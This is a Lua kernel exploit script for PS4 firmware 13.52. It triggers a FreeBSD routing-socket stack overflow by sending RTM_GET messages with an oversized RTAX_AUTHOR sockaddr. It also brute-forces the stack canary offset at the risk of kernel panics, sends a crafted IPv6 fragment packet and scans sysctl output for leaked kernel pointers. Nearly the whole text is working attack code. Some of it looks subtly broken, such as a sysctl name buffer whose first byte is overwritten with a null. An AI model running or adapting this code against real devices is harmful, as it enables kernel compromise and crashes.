------------------------------------------------------------
PS4 FW 13.52 - CVE-2026-3038 RTSock Stack Overflow Exploit
FreeBSD-SA-26:05.route - rtsock_msg_buffer() stack overflow
Vulnerability: KASSERT compiles out, sa_len up to 255,
  sockaddr_storage is 128 bytes = 127 byte overflow
Trigger: RTM_GET with RTAX_AUTHOR sockaddr having sa_len > 128
Impact: Stack canary overwrite -> panic or potential RCE
------------------------------------------------------------

function read_qw(addr)
  local b0 = memory.read_byte(addr)
  local b1 = memory.read_byte(addr + 1)
  local b2 = memory.read_byte(addr + 2)
  local b3 = memory.read_byte(addr + 3)
  local b4 = memory.read_byte(addr + 4)
  local b5 = memory.read_byte(addr + 5)
  local b6 = memory.read_byte(addr + 6)
  local b7 = memory.read_byte(addr + 7)
  return b0 + b1*256 + b2*65536 + b3*16777216 + b4*4294967296 + b5*1099511627776 + b6*281474976710656 + b7*72057594037927936
end

local function s(n, a1, a2, a3, a4, a5, a6)
  local stub = syscall_stub[n]
  if not stub then stub = syscall_stub[675] end
  return native.fcall_with_rax(stub + 10, n, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end

------------------------------------------------------------
-- Routing Socket Constants (FreeBSD)
------------------------------------------------------------
local PF_ROUTE   = 17
local SOCK_RAW   = 3

-- RTM message types
local RTM_GET    = 0x0A  -- Get routing info

-- RTA address types
local RTAX_DST     = 0
local RTAX_GATEWAY = 1
local RTAX_NETMASK = 2
local RTAX_AUTHOR  = 6  -- The key! This slips through validation

-- rtm_flags
local RTF_HOST = 0x0002

-- sockaddr structures
local AF_INET  = 2
local AF_LINK  = 18

------------------------------------------------------------
-- Helper: Build sockaddr_in
------------------------------------------------------------
function build_sockaddr_in(ip_hi, ip_lo, port)
  local buf = memory.alloc(16)
  memory.write_byte(buf, 16)       -- sa_len
  memory.write_byte(buf + 1, AF_INET)  -- sa_family
  memory.write_word(buf + 2, port or 0)
  memory.write_dword(buf + 4, ip_hi)  -- IP high
  memory.write_dword(buf + 8, ip_lo)  -- IP low
  memory.write_qword(buf + 12, 0)
  return buf
end

------------------------------------------------------------
-- Helper: Build OVERSIZED sockaddr (the CVE trigger)
-- sa_len = 255 (max), but sockaddr_storage is only 128 bytes
-- This causes 127-byte stack overflow in rtsock_msg_buffer()
------------------------------------------------------------
function build_oversized_sockaddr()
  local buf = memory.alloc(256)
  -- Fill with controlled pattern (will overwrite stack)
  for i = 0, 255 do
    memory.write_byte(buf + i, 0x41)  -- 'A' pattern
  end
  -- Set the critical fields
  memory.write_byte(buf, 255)         -- sa_len = 255 (MAX!)
  memory.write_byte(buf + 1, AF_INET) -- sa_family
  -- Rest is controlled overflow data
  return buf
end

------------------------------------------------------------
-- Helper: Build rtm_msghdr
------------------------------------------------------------
function build_rtm_header(msglen, rtm_type, rtm_index)
  local buf = memory.alloc(128)
  for i = 0, 127 do memory.write_byte(buf + i, 0) end

  -- struct rt_msghdr layout:
  -- +0x00: rtm_msglen  (uint16)
  -- +0x02: rtm_version (uint8)
  -- +0x03: rtm_type    (uint8)
  -- +0x04: rtm_index   (uint32)
  -- +0x08: rtm_flags   (uint32)
  -- +0x0C: rtm_addrs   (uint32) -- bitmask of RTA_* present
  -- +0x10: rtm_pid     (uint32)
  -- +0x14: rtm_seq     (uint32)
  -- +0x18: rtm_errno   (uint32)
  -- +0x1C: rtm_use     (uint32)
  -- +0x20: rtm_inits   (uint32)
  -- +0x24: rtm_hop     (uint32) -- metrics start

  memory.write_word(buf, msglen)       -- rtm_msglen
  memory.write_byte(buf + 2, 5)        -- rtm_version (RTM_VERSION=5)
  memory.write_byte(buf + 3, rtm_type) -- rtm_type
  memory.write_dword(buf + 4, rtm_index or 0)  -- rtm_index
  memory.write_dword(buf + 8, RTF_HOST) -- rtm_flags

  return buf
end

------------------------------------------------------------
-- CVE-2026-3038 Trigger: Unprivileged RTM_GET with
-- oversized RTAX_AUTHOR sockaddr
------------------------------------------------------------
function trigger_cve_2026_3038()
  print("\n=== CVE-2026-3038: RTSock Stack Overflow ===")
  print("Target: rtsock_msg_buffer() KASSERT bypass")
  print("Overflow: 127 bytes via sa_len=255 sockaddr")
  print("Path: RTM_GET + RTAX_AUTHOR (unprivileged)")

  -- Step 1: Open routing socket (PF_ROUTE, no privilege needed for RTM_GET)
  local fd = s(97, PF_ROUTE, SOCK_RAW, 0)  -- socket(PF_ROUTE, SOCK_RAW, 0)
  print(string.format("  socket(PF_ROUTE): fd=%d", fd))

  if fd < 0 or fd >= 1024 then
    print("  FAILED to open routing socket!")
    print("  PF_ROUTE may be sandboxed on PS4")
    return false
  end

  -- Step 2: Build the overflow sockaddr for RTAX_AUTHOR
  -- This is the KEY to the exploit:
  -- cleanup_xaddrs() only validates RTAX_DST, RTAX_GATEWAY, RTAX_NETMASK
  -- RTAX_AUTHOR is NEVER validated, so sa_len=255 passes through
  local oversized_sa = build_oversized_sockaddr()

  -- Step 3: Build RTM_GET message header
  -- rtm_addrs = (1 << RTAX_AUTHOR) = (1 << 6) = 0x40
  local msglen = 0x60 + 256  -- header + oversized sockaddr
  local rtm = build_rtm_header(msglen, RTM_GET, 0)
  memory.write_dword(rtm + 0x0C, 0x40)  -- rtm_addrs = RTA_AUTHOR only

  -- Step 4: Build the full message buffer
  local msgbuf = memory.alloc(msglen + 256)
  for i = 0, msglen + 255 do memory.write_byte(msgbuf + i, 0) end

  -- Copy rtm header
  for i = 0, 0x5F do
    memory.write_byte(msgbuf + i, memory.read_byte(rtm + i))
  end

  -- Copy oversized sockaddr at offset 0x60 (where RTAX_AUTHOR goes)
  -- When rtsock_msg_buffer() processes this:
  --   sa_len = 255 (from the sockaddr)
  --   dlen = SA_SIZE(sa) = 255 (rounded up)
  --   sizeof(ss) = 128 (sockaddr_storage)
  --   bcopy(sa, &ss, sa->sa_len) -> OVERFLOW by 127 bytes!
  for i = 0, 255 do
    memory.write_byte(msgbuf + 0x60 + i, memory.read_byte(oversized_sa + i))
  end

  print(string.format("  Message buffer: 0x%x bytes", msglen))
  print(string.format("  RTAX_AUTHOR sockaddr: sa_len=255"))
  print(string.format("  Expected overflow: 127 bytes past sockaddr_storage"))

  -- Step 5: Send the message via sendto()
  -- sendto(fd, msg, msglen, 0, NULL, 0)
  print("\n  Sending RTM_GET with oversized RTAX_AUTHOR...")
  local r = s(133, fd, msgbuf, msglen, 0, 0, 0)
  print(string.format("  sendto() returned: 0x%x", r))

  if r == 0 then
    print("  Message sent! Checking for response...")
    -- Try to read the response (may contain leaked data)
    local resp = memory.alloc(4096)
    for i = 0, 4095 do memory.write_byte(resp + i, 0) end
    local nread = s(3, fd, resp, 4096)
    print(string.format("  recv() returned: %d bytes", nread))

    if nread > 0 then
      print("  Response data (first 128 bytes):")
      for i = 0, math.min(127, nread - 1), 16 do
        local hexbytes = ""
        for j = 0, 15 do
          if i + j < nread then
            hexbytes = hexbytes .. string.format("%02x ", memory.read_byte(resp + i + j))
          end
        end
        print(string.format("    0x%04x: %s", i, hexbytes))
      end

      -- Check for stack data leak
      -- The overflow data (0x41 pattern) may appear in the response
      local leaked = false
      for i = 0x60, math.min(nread - 1, 0x160) do
        if memory.read_byte(resp + i) == 0x41 then
          if not leaked then
            print("\n  *** STACK DATA DETECTED IN RESPONSE ***")
            leaked = true
          end
          print(string.format("    Offset 0x%03x: 0x41 (our overflow pattern!)", i))
        end
      end

      -- Check for potential kernel pointers (0xffffff80xxxxxxxx pattern)
      for i = 0, nread - 8, 8 do
        local v = read_qw(resp + i)
        if v >= 0xFFFFFF8000000000 and v <= 0xFFFFFFFFFFFFFFFF then
          print(string.format("  *** KERNEL POINTER at offset 0x%03x: 0x%x ***", i, v))
        elseif v >= 0xFFFFFFFF80000000 and v <= 0xFFFFFFFFFFFFFFFF then
          print(string.format("  *** KERNEL POINTER (legacy) at offset 0x%03x: 0x%x ***", i, v))
        end
      end
    end
  elseif r == -1 then
    print("  sendto() failed - message may be too large or sandboxed")
    -- Try smaller overflow sizes
    print("\n  Trying smaller overflow sizes...")
    for try_len = 129, 200, 10 do
      local try_msglen = 0x60 + try_len
      local try_rtm = build_rtm_header(try_msglen, RTM_GET, 0)
      memory.write_dword(try_rtm + 0x0C, 0x40)

      local try_buf = memory.alloc(try_msglen + 64)
      for i = 0, try_msglen + 63 do memory.write_byte(try_buf + i, 0) end
      for i = 0, 0x5F do
        memory.write_byte(try_buf + i, memory.read_byte(try_rtm + i))
      end

      -- Fill sockaddr with pattern
      memory.write_byte(try_buf + 0x60, try_len)
      memory.write_byte(try_buf + 0x61, AF_INET)
      for i = 2, try_len - 1 do
        memory.write_byte(try_buf + 0x60 + i, 0x41)
      end

      r = s(133, fd, try_buf, try_msglen, 0, 0, 0)
      print(string.format("    sa_len=%d: sendto()=0x%x", try_len, r))
      if r == 0 then
        print("    *** SUCCESS! Overflow size found ***")
        break
      end
    end
  end

  s(6, fd)
  return true
end

------------------------------------------------------------
-- Alternative: Try via raw socket with different flags
------------------------------------------------------------
function trigger_alt_route()
  print("\n=== Alternative Route Socket Trigger ===")

  -- Try different socket types
  local socket_types = {
    {PF_ROUTE, SOCK_RAW, 0},
    {PF_ROUTE, 3, 0},   -- SOCK_RAW
    {AF_INET, 3, 0},    -- regular raw socket
  }

  for _, stype in ipairs(socket_types) do
    local fd = s(97, stype[1], stype[2], stype[3])
    print(string.format("  socket(%d, %d, %d): fd=%d", stype[1], stype[2], stype[3], fd))
    if fd >= 0 and fd < 1024 then
      -- Build minimal RTM_GET with RTAX_AUTHOR
      local msglen = 0x60 + 20  -- header + minimal sockaddr
      local msgbuf = memory.alloc(msglen + 64)
      for i = 0, msglen + 63 do memory.write_byte(msgbuf + i, 0) end

      -- rtm header
      memory.write_word(msgbuf, msglen)
      memory.write_byte(msgbuf + 2, 5)
      memory.write_byte(msgbuf + 3, RTM_GET)
      memory.write_dword(msgbuf + 0x0C, 0x40)  -- RTA_AUTHOR

      -- Oversized sockaddr at offset 0x60
      memory.write_byte(msgbuf + 0x60, 255)  -- sa_len = 255!
      memory.write_byte(msgbuf + 0x61, AF_INET)
      for i = 2, 19 do memory.write_byte(msgbuf + 0x60 + i, 0x41) end

      local r = s(133, fd, msgbuf, msglen, 0, 0, 0)
      print(string.format("    sendto: ret=0x%x", r))

      if r == 0 then
        local resp = memory.alloc(4096)
        for i = 0, 4095 do memory.write_byte(resp + i, 0) end
        local nread = s(3, fd, resp, 4096)
        print(string.format("    recv: %d bytes", nread))
      end

      s(6, fd)
    end
  end
end

------------------------------------------------------------
-- Canary Leak Attempt
-- If the overflow partially overwrites the canary,
-- we might be able to leak it via the panic message
-- or via a secondary read primitive
------------------------------------------------------------
function attempt_canary_leak()
  print("\n=== Canary Leak Attempt ===")
  print("Strategy: Overflow with incremental patterns to find canary offset")

  local fd = s(97, PF_ROUTE, SOCK_RAW, 0)
  if fd < 0 or fd >= 1024 then
    print("  Cannot open PF_ROUTE")
    return
  end

  -- The stack layout of rtsock_msg_buffer():
  -- [local vars] [saved rbp] [ret addr] [canary]
  -- The canary is between the locals and the saved rbp/ret
  -- With sa_len=255 and sockaddr_storage=128:
  --   Bytes 0-127: fill sockaddr_storage
  --   Bytes 128-254: overflow into stack frame
  --
  -- We need to find exactly where the canary is
  -- by sending incrementing patterns and seeing which
  -- byte value causes a panic vs not

  -- For PS4, the canary is typically at a fixed offset
  -- from the stack buffer. We'll try to determine it
  -- by sending controlled patterns.

  for canary_byte_pos = 128, 200, 4 do
    local msglen = canary_byte_pos + 16
    local msgbuf = memory.alloc(msglen + 64)
    for i = 0, msglen + 63 do memory.write_byte(msgbuf + i, 0) end

    memory.write_word(msgbuf, msglen)
    memory.write_byte(msgbuf + 2, 5)
    memory.write_byte(msgbuf + 3, RTM_GET)
    memory.write_dword(msgbuf + 0x0C, 0x40)

    -- Fill with known pattern
    for i = 0x60, msglen - 1 do
      memory.write_byte(msgbuf + i, 0x41)
    end

    -- Put marker at canary_byte_pos
    memory.write_byte(msgbuf + canary_byte_pos, 0x42)
    memory.write_byte(msgbuf + canary_byte_pos + 1, 0x42)
    memory.write_byte(msgbuf + canary_byte_pos + 2, 0x42)
    memory.write_byte(msgbuf + canary_byte_pos + 3, 0x42)

    -- This is a crash test - if we hit the canary, kernel panics
    -- If we don't hit it, we get a response
    print(string.format("  Testing canary at byte %d...", canary_byte_pos))

    -- Note: This WILL crash the kernel if canary is hit!
    -- Only run this if you have a way to recover (PS4 reboot)
    local r = s(133, fd, msgbuf, msglen, 0, 0, 0)
    if r == 0 then
      print(string.format("    No crash at byte %d - canary is lower", canary_byte_pos))
    else
      print(string.format("    Possible crash/error at byte %d - canary may be here", canary_byte_pos))
    end
  end

  s(6, fd)
end

------------------------------------------------------------
-- PART 2: Broader FreeBSD 13.x Attack Surface
-- Test other known vulnerability patterns
------------------------------------------------------------
function test_freebsd_attacks()
  print("\n=== FreeBSD 13.x Attack Surface Probing ===")

  -- 1. IPv6 fragment reassembly (CVE-2023-3107)
  -- Integer overflow in payload length calculation
  -- PS4 FW 13.52 is based on FreeBSD ~13.0-13.5
  print("\n  --- IPv6 Fragment Attack (CVE-2023-3107) ---")
  local sv6 = syscall_stub[97]  -- socket
  -- Try to create IPv6 raw socket
  local fd6 = s(97, 28, 3, 0)  -- AF_INET6=28, SOCK_RAW=3
  print(string.format("  IPv6 raw socket: fd=%d", fd6))

  if fd6 >= 0 and fd6 < 1024 then
    -- Build fragmented IPv6 packet
    local pkt = memory.alloc(2048)
    for i = 0, 2047 do memory.write_byte(pkt + i, 0) end

    -- IPv6 header: version=6, payload_length=0xFFFF (will overflow when reassembled)
    memory.write_byte(pkt, 0x60)  -- version
    memory.write_byte(pkt + 1, 0)  -- traffic class
    memory.write_word(pkt + 2, 0)  -- flow label
    memory.write_word(pkt + 4, 0xFFFF)  -- payload length (OVERFLOW trigger!)
    memory.write_byte(pkt + 6, 59)  -- next header = no next header
    memory.write_byte(pkt + 7, 64)  -- hop limit
    -- Source IPv6 (zeros = ::1 or loopback)
    memory.write_dword(pkt + 8, 0)
    memory.write_dword(pkt + 12, 0)
    memory.write_dword(pkt + 16, 0)
    memory.write_dword(pkt + 20, 1)  -- ::1
    -- Destination IPv6
    memory.write_dword(pkt + 24, 0)
    memory.write_dword(pkt + 28, 0)
    memory.write_dword(pkt + 32, 0)
    memory.write_dword(pkt + 36, 1)

    -- Fragment header
    memory.write_byte(pkt + 40, 44)  -- next header = fragment
    memory.write_byte(pkt + 41, 0)   -- reserved
    memory.write_word(pkt + 42, 0)   -- fragment offset + more flag
    memory.write_dword(pkt + 44, 1)  -- identification

    -- Send the crafted fragment
    local r = s(133, fd6, pkt, 48, 0, 0, 0)
    print(string.format("  IPv6 frag send: ret=0x%x", r))
    s(6, fd6)
  end

  -- 2. NFS client attack (CVE-2023-6660)
  -- copy_from_user bug in IO_APPEND writes
  print("\n  --- NFS Client Bug (CVE-2023-6660) ---")
  print("  (Requires NFS mount - unlikely on PS4)")

  -- 3. Wi-Fi encryption bypass (CVE-2022-47522)
  print("\n  --- Wi-Fi Bypass (CVE-2022-47522) ---")
  print("  (Requires Wi-Fi interface access)")

  -- 4. Test sysctl for info leaks that could help CVE-2026-3038 exploitation
  print("\n  --- Sysctl Info Leak for Canary Discovery ---")
  local sysctl_names = {
    "kern.usrstack",
    "kern.ps_strings",
    "kern.smp.cpus",
    "kern.init_safe_mode",
    "kern.neomode",
    "hw.sce_subsys_subid",
    "vm.ps4dev.trcmem_total",
    "vm.ps4dev.trcmem_avail",
    "kern.dmem.game_budget_limit",
    "kern.cpumode_game",
  }

  for _, name in ipairs(sysctl_names) do
    local name_buf = memory.alloc(#name + 1)
    for i = 1, #name do memory.write_byte(name_buf + i - 1, string.byte(name, i)) end
    memory.write_byte(name_buf, 0)

    local oldp = memory.alloc(256)
    local oldlenp = memory.alloc(8)
    memory.write_qword(oldlenp, 256)
    for i = 0, 255 do memory.write_byte(oldp + i, 0) end

    local r = s(202, name_buf, 0, oldp, oldlenp, 0, 0)
    if r == 0 then
      local vlen = read_qw(oldlenp)
      print(string.format("  sysctl '%s': len=%d", name, vlen))
      -- Read the value
      if vlen == 8 then
        local v = read_qw(oldp)
        print(string.format("    value: 0x%x", v))
        -- Check if it looks like a kernel pointer
        if v >= 0xFFFFFFFF80000000 and v <= 0xFFFFFFFFFFFFFFFF then
          print("    *** KERNEL POINTER LEAKED! ***")
        elseif v >= 0xFFFFFF8000000000 and v <= 0xFFFFFFFFFFFFFFFF then
          print("    *** KERNEL POINTER (KASLR) LEAKED! ***")
        end
      elseif vlen > 0 and vlen <= 64 then
        for i = 0, vlen - 1, 8 do
          local v = read_qw(oldp + i)
          if v ~= 0 then
            print(string.format("    [%d] = 0x%x", i, v))
          end
        end
      end
    end
  end

  -- 5. Test routing socket sysctl for canary/stack info
  print("\n  --- Routing-related sysctls ---")
  local route_sysctls = {
    "net.route.netmask.allocs",
    "net.route.netmask.frees",
    "net.route.netmask.killholes",
    "net.inet.ip.redirect",
    "net.inet.ip.sendsourcequench",
    "net.inet.ip.maxfragpackets",
    "net.inet.ip.maxfragsperpacket",
  }

  for _, name in ipairs(route_sysctls) do
    local name_buf = memory.alloc(#name + 1)
    for i = 1, #name do memory.write_byte(name_buf + i - 1, string.byte(name, i)) end
    memory.write_byte(name_buf, 0)

    local oldp = memory.alloc(64)
    local oldlenp = memory.alloc(8)
    memory.write_qword(oldlenp, 64)
    for i = 0, 63 do memory.write_byte(oldp + i, 0) end

    local r = s(202, name_buf, 0, oldp, oldlenp, 0, 0)
    if r == 0 then
      local vlen = read_qw(oldlenp)
      if vlen == 4 then
        local v = memory.read_dword(oldp)
        print(string.format("  %s = %d", name, v))
      elseif vlen == 8 then
        local v = read_qw(oldp)
        print(string.format("  %s = 0x%x", name, v))
      end
    end
  end
end

------------------------------------------------------------
-- MAIN
------------------------------------------------------------
print("============================================")
print("PS4 FW 13.52 - CVE-2026-3038 + FreeBSD Attacks")
print("============================================")
print("WARNING: CVE-2026-3038 triggers kernel panic!")
print("Make sure PS4 can be recovered (reboot)")
print("============================================")

-- First test if PF_ROUTE is accessible
print("\n=== Pre-flight: Testing PF_ROUTE access ===")
local test_fd = s(97, 17, 3, 0)  -- socket(PF_ROUTE, SOCK_RAW, 0)
print(string.format("  socket(PF_ROUTE, SOCK_RAW, 0): fd=%d", test_fd))

if test_fd >= 0 and test_fd < 1024 then
  print("  PF_ROUTE is ACCESSIBLE!")
  s(6, test_fd)

  -- Test normal RTM_GET first (should work without crash)
  print("\n=== Pre-flight: Normal RTM_GET ===")
  local fd = s(97, 17, 3, 0)
  local msgbuf = memory.alloc(512)
  for i = 0, 511 do memory.write_byte(msgbuf + i, 0) end
  memory.write_word(msgbuf, 0x60)  -- rtm_msglen = 96
  memory.write_byte(msgbuf + 2, 5) -- version
  memory.write_byte(msgbuf + 3, 10) -- RTM_GET
  memory.write_dword(msgbuf + 0x0C, 0x01)  -- RTA_DST

  -- Build proper sockaddr_in for DST
  memory.write_byte(msgbuf + 0x60, 16)
  memory.write_byte(msgbuf + 0x61, AF_INET)
  memory.write_dword(msgbuf + 0x68, 0x0100007F)  -- 127.0.0.1

  local r = s(133, fd, msgbuf, 0x60 + 16, 0, 0, 0)
  print(string.format("  Normal RTM_GET: ret=0x%x", r))
  s(6, fd)

  if r == 0 then
    print("  Normal RTM_GET works! Proceeding with CVE trigger...")
    trigger_cve_2026_3038()
  else
    print("  Normal RTM_GET failed, trying alternative...")
    trigger_alt_route()
  end
else
  print("  PF_ROUTE is BLOCKED (sandboxed)")
  print("  Falling back to sysctl info leak attack")
end

-- Always run sysctl probing (safe, no crash)
test_freebsd_attacks()

print("\n============================================")
print("COMPLETE - Check output for kernel pointers")
print("============================================")
